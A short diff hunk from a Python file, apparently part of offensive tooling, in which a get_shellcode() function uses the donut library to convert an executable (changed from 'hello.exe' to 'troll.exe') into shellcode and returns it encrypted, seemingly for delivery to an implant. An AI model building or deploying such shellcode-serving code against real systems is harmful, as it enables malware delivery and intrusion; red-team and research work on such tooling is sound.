@@ -162,7 +162,8 @@ def get_shellcode():
     # if data == None:
     #     return encrypt_data({"status": "no data"})
     # shellcode = donut.create(file="test.dll", method="IAmAGoodNoodle")
-    shellcode = donut.create(file="hello.exe")
+    # print(shellcode)
+    shellcode = donut.create(file="troll.exe")
     return encrypt_shellcode(shellcode)
 
     
